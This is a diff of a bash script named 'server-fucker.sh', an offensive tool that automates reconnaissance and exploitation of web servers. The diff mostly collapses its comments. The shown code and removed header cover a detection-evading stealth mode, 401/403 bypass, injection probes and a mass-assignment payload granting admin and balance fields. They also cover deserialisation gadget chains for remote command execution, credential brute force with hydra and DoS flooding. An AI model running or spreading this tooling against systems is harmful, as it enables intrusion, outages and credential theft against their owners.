@@ -1,75 +1,5 @@
 #!/usr/bin/env bash
-#
-# Includes:
-#   * Network: routing, hyperscaler inference, DNS misconfigs.
-#   * Host: port scan, service versions, CVE matching (nmap), TLS audit.
-#   * Web: deep crawl (+gau/wayback), JS endpoint mining, secret mining, headers.
-#   * Stack: server/CDN + frontend (React/Vue/Angular/Svelte/Next/Nuxt/HTMX/Alpine)
-#            + backend framework fingerprint, with framework-specific follow-ups.
-#   * API: route discovery (kiterunner), OpenAPI/Swagger + GraphQL (introspection,
-#          batching, field-suggestion, mutations), method mapping, WebSocket
-#          discovery + message-level fuzzing (SSTI/SQLi/XSS/CSWSH),
-#          parameter fuzzing (arjun/ffuf).
-#   * Access: 401/403 bypass (header/path tricks), CORS reflection, Host-header
-#             injection, cache poisoning, .well-known/security.txt exposure.
-#   * AuthZ: IDOR/BOLA + BFLA via 2nd identity (--cookie2), object enumeration,
-#            mass assignment, JWT analysis (alg:none/weak-secret/claims).
-#   * Verified injection (response evidence): SSTI, OS-cmd, path traversal,
-#            SQL-error, SSRF, XXE, insecure deserialization, open redirect.
-#            Adaptive soft-404 baseline. Confirmed findings emit PoC curls (pocs.sh).
-#   * Exploit: deser gadget chains (ysoserial/phpggc) fired at sinks with OOB
-#            proof of RCE (--dos + --collab; --rce-cmd for a custom command).
-#   * Smuggling: native CL.TE/TE.CL timing detection (raw sockets, --dos).
-#   * Secrets: JS bundle sweep (TOKEN=/Bearer/apiKey/cloud keys) + trufflehog,
-#            source-map (.map) theft, favicon hash pivot.
-#   * Vuln: nuclei (whole corpus, OOB via --collab), XSS (dalfox), SQLi (sqlmap).
-#   * Break: deep 5xx provocation - malformed bodies, type confusion, oversized
-#            input, verb tampering, per-error capture.   [--dos only]
-#   * Brute: SSH and HTTP credential testing (hydra).     [skipped in --stealth]
-#   * Stress: L4/L7 DoS exposure (wrk/slowhttptest/hping3).  [--dos only]
-#
-# Usage:
-#   server-fucker.sh <target...> [options]
-#     <target>            host, host:port, or URL (http[s]://host[:port][/path])
-#     @file / --targets <file>   read targets from a file (one per line)
-#
-#   --cookie <string>     session cookie for authenticated scanning
-#   --header <string>     custom header (e.g. "Authorization: Bearer <token>")
-#   --cookie2 <string>    second, lower-privileged session -> unlocks IDOR/BFLA cross-user
-#   --header2 <string>    second identity via header (alternative to --cookie2)
-#   --collab <host|url>   OOB collaborator (interactsh/Burp) for blind SSRF/RCE/log4shell
-#   --reauth-cmd <cmd>    shell cmd printing a fresh cookie/header value; auto-refreshes
-#                         the session mid-scan when the token expires (base URL 401/403)
-#   --rce-cmd <cmd>       command to execute on target via deser gadget chains (--dos);
-#                         default is an OOB callback to --collab (proof without a shell)
-#   --spa                 enable headless-browser crawl (needs system chromium)
-#   --full-ports          scan all 65535 TCP ports (default: top 1000)
-#   --duration <sec>      per-tool time budget (default 60)
-#   --max-time <sec>      overall wall-clock ceiling
-#   --tool-timeout <sec>  hard per-tool kill backstop (default DURATION*20, min 300)
-#   --out <dir>           report directory
-#   --yes / -y            skip the interactive authorization prompt (assume yes)
-#   --dos                 ENABLE flooding + 500-provocation (off by default; can crash target)
-#   --stealth             slow, single-flow, jittered, low-noise; disables DoS/brute
-#   --rate <rps>          global request-rate cap for fuzzers/probes (default: unbounded)
-#
-# Examples:
-#   server-fucker.sh 192.168.1.1
-#   server-fucker.sh https://app.example.com --cookie "session=abc"
-#   # full API-authz + injection run with two identities and an OOB collaborator:
-#   server-fucker.sh https://api.example.com --cookie "admin=..." \
-#       --cookie2 "user=..." --collab abc123.oast.fun --dos --yes
-#
-#   # Run sequentially over many URLs from a file (one target per line), one at a
-#   # time, auto-authorizing each. xargs -L1 feeds a single target per invocation;
-#   # -P1 keeps them serial so reports/output do not interleave:
-#   xargs -L1 -P1 server-fucker.sh --yes < targets.txt
-#   # or from a pipe:
-#   printf '%s\n' host1 https://host2 host3:8443 | xargs -L1 -P1 server-fucker.sh --yes
-#
-# Dependencies:
-#
-# yay -S --needed curl jq iputils whois bind nmap sslscan testssl.sh gobuster nikto sqlmap hydra wrk hping slowhttptest python openssl chromium httpx-bin subfinder-bin katana-bin naabu-bin nuclei-bin nuclei-templates ffuf-bin gowitness-bin dalfox-bin kiterunner-bin arjun trufflehog wafw00f seclists gau waybackurls python-mmh3 ysoserial phpggc
+# Includes: * Network: routing, hyperscaler inference, DNS misconfigs.
 
 set -uo pipefail
 
@@ -194,8 +124,7 @@ HTTPX_AUTH=(); NUCLEI_AUTH=(); FFUF_AUTH=(); KATANA_AUTH=(); SQLMAP_AUTH=(); CUR
 [ -n "$COOKIE" ] && { HTTPX_AUTH+=(-cookie "$COOKIE"); NUCLEI_AUTH+=(-cookie "$COOKIE"); FFUF_AUTH+=(-b "$COOKIE"); KATANA_AUTH+=(-cookie "$COOKIE"); SQLMAP_AUTH+=(--cookie "$COOKIE"); CURL_AUTH+=(-b "$COOKIE"); }
 [ -n "$HEADER" ] && { HTTPX_AUTH+=(-header "$HEADER"); NUCLEI_AUTH+=(-header "$HEADER"); FFUF_AUTH+=(-H "$HEADER"); KATANA_AUTH+=(-header "$HEADER"); SQLMAP_AUTH+=(--header "$HEADER"); CURL_AUTH+=(-H "$HEADER"); }
 
-## ---------------------------------------------------------------- speed / stealth tuning
-# Derived knobs threaded into every tool so --stealth / --rate change behaviour globally.
+# # ---------------------------------------------------------------- speed / stealth tuning Derived knobs threaded into every tool so --stealth / --rate change behaviour globally.
 THREADS=40; FFUF_RATE=0; NUCLEI_RL=150; KATANA_C=15; KATANA_RL=150
 NMAP_TIMING="-T4"; NAABU_TUNE=(); SQLMAP_TUNE=(); DALFOX_TUNE=(); FFUF_DELAY=()
 PROBE_JITTER=0            # max seconds of random sleep between manual curl probes
@@ -203,8 +132,7 @@ STEALTH_UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 UA=""
 
 if [ "$STEALTH" = 1 ]; then
-    # Blend into background noise: single flow, low packet rate, big random jitter,
-    # realistic browser UA, and NO flooding/brute (those are unmistakable).
+    # Blend into background noise: single flow, low packet rate, big random jitter, realistic browser UA, and NO flooding/brute (those are unmistakable).
     DOS=0
     THREADS=1; FFUF_RATE=1; NUCLEI_RL=1; KATANA_C=1; KATANA_RL=2
     NMAP_TIMING="-T1"; NAABU_TUNE=(-rate 10 -c 1); SQLMAP_TUNE=(--delay 4 --random-agent)
@@ -286,8 +214,7 @@ SUMMARY="$OUTDIR/raw/run.log"
 REPORT="$OUTDIR/REPORT.md"
 : > "$SUMMARY"
 
-# Preflight tool inventory: record every expected tool that is not installed so
-# the operator knows which parts of the assessment were skipped for lack of a binary.
+# Preflight tool inventory: record every expected tool that is not installed so the operator knows which parts of the assessment were skipped for lack of a binary.
 MISSING_INV="$OUTDIR/raw/missing-inventory.txt"; : > "$MISSING_INV"
 EXPECTED_TOOLS="curl jq tracepath whois host wafw00f gowitness katana \
 subfinder trufflehog gau waybackurls naabu nmap testssl sslscan gobuster ffuf kr \
@@ -345,8 +272,6 @@ run() {
     fi
     local t0=$SECONDS sl
     # per-tool timeout backstop: prevents one hung tool from stalling the phase.
-    # Sits above each tool's own internal budgets. Skipped for shell-function tasks
-    # (openapi_probe/provoke500/...) since `timeout` can only exec real binaries.
     local to="$TOOL_TIMEOUT"
     if [ "$to" -gt 0 ] 2>/dev/null; then
         [ "$to" -lt 10 ] && to=10                 # honor explicit --tool-timeout (min 10s)
@@ -384,8 +309,7 @@ _curl_auth() {
     [ -n "$UA" ]     && _CA+=(-A "$UA")
 }
 
-# transient-failure retry for *discovery* curls (safe: never used by the 500-hunter,
-# which must see 5xx rather than retry through them).
+# transient-failure retry for *discovery* curls (safe: never used by the 500-hunter, which must see 5xx rather than retry through them).
 _RETRY=(--retry 2 --retry-delay 1 --retry-connrefused)
 
 # random sleep between manual probes; 0 in normal mode, up to PROBE_JITTER s in stealth.
@@ -394,8 +318,7 @@ _jitter() {
     sleep "$(awk -v m="$PROBE_JITTER" 'BEGIN{srand();printf "%.1f", 1+rand()*(m-1)}')" 2>/dev/null || true
 }
 
-# GET a URL, echo "STATUS BYTELEN [ELAPSED_MS]". Uses primary auth (_CA) unless caller
-# passes -b/-H overrides after the URL. Requires _curl_auth to have been called.
+# GET a URL, echo "STATUS BYTELEN [ELAPSED_MS]".
 _probe() { # url [extra curl args...]
     local url="$1"; shift
     local out; out=$(mktemp 2>/dev/null) || { echo "000 0 0"; return; }
@@ -406,8 +329,7 @@ _probe() { # url [extra curl args...]
     rm -f "$out"; echo "${code:-000} ${len:-0} ${ms:-0}"
 }
 
-# Soft-404 / catch-all calibration. Sets BL_STATUS/BL_LEN/BL_WK_STATUS/CATCHALL globals.
-# MUST be called directly (not via run) so the globals survive in the parent shell.
+# Soft-404 / catch-all calibration.
 BL_STATUS=""; BL_LEN=0; BL_WK_STATUS=""; CATCHALL=0; BL_VAR=0
 calibrate_baseline() {
     _curl_auth
@@ -423,7 +345,6 @@ calibrate_baseline() {
 }
 
 # Does a (code,len) result meaningfully differ from the catch-all baseline?
-# Threshold adapts to observed soft-404 size variance (avoids FPs on dynamic pages).
 _differs() { # code len
     [ "${1:-}" != "$BL_STATUS" ] && return 0
     local d=$(( ${2:-0} - BL_LEN )); [ "$d" -lt 0 ] && d=$(( -d ))
@@ -455,10 +376,7 @@ rebuild_auth() {
     [ -n "$UA" ] && { HTTPX_AUTH+=(-header "User-Agent: $UA"); NUCLEI_AUTH+=(-header "User-Agent: $UA"); FFUF_AUTH+=(-H "User-Agent: $UA"); KATANA_AUTH+=(-header "User-Agent: $UA"); CURL_AUTH+=(-A "$UA"); }
 }
 
-# Mid-scan session refresh: if the token has expired (base URL now 401/403) and a
-# --reauth-cmd was given, run it to obtain a fresh cookie/header value, then rebuild
-# all auth arrays. reauth-cmd must print the replacement value (cookie string, or the
-# header value if HEADER-based auth) on stdout. Called at phase boundaries.
+# Mid-scan session refresh: if the token has expired (base URL now 401/403) and a --reauth-cmd was given, run it to obtain a fresh cookie/header value, then rebuild all auth arrays.
 reauth_check() {
     [ -z "$REAUTH_CMD" ] && return 0
     [ -z "$COOKIE$HEADER" ] && return 0
@@ -694,8 +612,7 @@ bypass_probe() {
     [ -s "$eps" ] || { echo "no endpoints to test for 403/401 bypass"; return 0; }
     local u base host path code len i=0
     host="${HOST}"
-    # report a bypass only if it's a success code AND the body differs from the
-    # catch-all baseline (kills false positives on wildcard-200 servers).
+    # report a bypass only if it's a success code AND the body differs from the catch-all baseline (kills false positives on wildcard-200 servers).
     _try() { # label extra-curl-args... url
         local label="$1"; shift
         _jitter
@@ -792,7 +709,6 @@ misconfig_probe() {
 }
 
 # ---- active injection verified by RESPONSE CONTENT (SSTI/cmdi/traversal/SQLerr/SSRF).
-# Not gated by --dos (light, non-destructive) EXCEPT time-based blind tests.
 inject_verify() {
     local params="$1"
     local out="$OUTDIR/raw/inject-verified.txt"; : > "$out"
@@ -935,10 +851,7 @@ authz_probe() {
             fi
         fi
 
-        # --- mass assignment: privileged fields accepted on write endpoints ---
-        # Hardened: compare a benign PUT baseline vs a privileged PUT. Only flag when
-        # the priv write is accepted AND either reflects an injected field or the
-        # response meaningfully differs from the benign baseline (cuts blanket-200 FPs).
+        # --- mass assignment: privileged fields accepted on write endpoints --- Hardened: compare a benign PUT baseline vs a privileged PUT.
         if printf '%s' "$u" | grep -qiE '/api/|/v[0-9]+/|/users?|/account|/profile|/settings'; then
             local ma bo bs bl ps pl pf
             ma='{"role":"admin","isAdmin":true,"is_admin":true,"is_staff":true,"account_balance":999999}'
@@ -1046,7 +959,6 @@ sourcemap_probe() {
 }
 
 # ---- generic secret sweep of JS bundles (TOKEN=/Bearer/apiKey/cloud keys/JWT/PEM).
-# Complements trufflehog (detectors) by catching loose hardcoded assignments.
 js_secrets_probe() {
     _curl_auth
     local out="$OUTDIR/raw/js-secrets.txt"; : > "$out"
@@ -1157,16 +1069,14 @@ websocket_probe() {
     grep -q WEBSOCKET "$out" 2>/dev/null || echo "no WebSocket (101) endpoints found" >> "$out"
 }
 
-# ---- WebSocket message-level fuzzing (RFC6455 client): speaks WS frames, fuzzes
-# messages (SSTI/SQLi/XSS/oversized/malformed), tests cross-origin handshake (CSWSH).
+# ---- WebSocket message-level fuzzing (RFC6455 client): speaks WS frames, fuzzes messages (SSTI/SQLi/XSS/oversized/malformed), tests cross-origin handshake (CSWSH).
 websocket_fuzz() {
     local out="$OUTDIR/raw/ws-fuzz.txt"; : > "$out"
     have python3 || { echo "python3 missing - cannot fuzz WebSocket" > "$out"; return 0; }
     grep -q WEBSOCKET "$OUTDIR/raw/websocket.txt" 2>/dev/null || { echo "no live WebSocket endpoints to fuzz" > "$out"; return 0; }
     local eps; eps=$(grep -aoE 'https?://[^ ]+' "$OUTDIR/raw/websocket.txt" | sort -u | head -10)
     local tf="$OUTDIR/raw/ws-targets.txt"; printf '%s\n' "$eps" > "$tf"
-    # NOTE: `python3 - <<PY` consumes stdin as the program, so targets are passed via a
-    # file argument (argv[3]) rather than piped stdin.
+    # NOTE: `python3 - <<PY` consumes stdin as the program, so targets are passed via a file argument (argv[3]) rather than piped stdin.
     python3 - "$COOKIE" "$HEADER" "$tf" > "$out" 2>/dev/null <<'PY'
 import sys, socket, ssl, base64, os, struct
 from urllib.parse import urlparse
@@ -1260,8 +1170,7 @@ xxe_probe() {
     grep -q 'XXE CONFIRMED' "$out" 2>/dev/null || echo "no XXE confirmed via file reflection" >> "$out"
 }
 
-# ---- web stack fingerprint: server/CDN + frontend + backend framework, with
-# framework-specific high-value follow-ups. Complements httpx -tech-detect.
+# ---- web stack fingerprint: server/CDN + frontend + backend framework, with framework-specific high-value follow-ups.
 fingerprint_stack() {
     _curl_auth
     local out="$OUTDIR/raw/stack.txt"; : > "$out"
@@ -1348,9 +1257,7 @@ deser_probe() {
     grep -qiE 'serialized|VIEWSTATE|DESERIALIZATION|pickle|Marshal' "$out" 2>/dev/null || echo "no serialization markers or deserialization errors found" >> "$out"
 }
 
-# ---- gadget-chain exploitation: build Java (ysoserial) / PHP (phpggc) deser gadgets
-# that trigger an OOB callback (proof of RCE) and fire them at detected deser sinks.
-# HARD-gated: --dos required + (--collab for OOB proof OR --rce-cmd for a custom command).
+# ---- gadget-chain exploitation: build Java (ysoserial) / PHP (phpggc) deser gadgets that trigger an OOB callback (proof of RCE) and fire them at detected deser sinks.
 exploit_deser() {
     local out="$OUTDIR/raw/deser-exploit.txt"; : > "$out"
     if [ "$DOS" != 1 ]; then echo "gadget exploitation skipped (needs --dos)" > "$out"; return 0; fi
@@ -1408,7 +1315,6 @@ exploit_deser() {
 }
 
 # ---- native HTTP request smuggling: CL.TE / TE.CL timing-differential detection.
-# Raw sockets (no smuggler binary needed). Intrusive (can desync proxies) -> --dos only.
 smuggle_native() {
     local out="$OUTDIR/raw/smuggling.txt"; : > "$out"
     have python3 || { echo "python3 missing - cannot run native smuggling probe" > "$out"; return 0; }
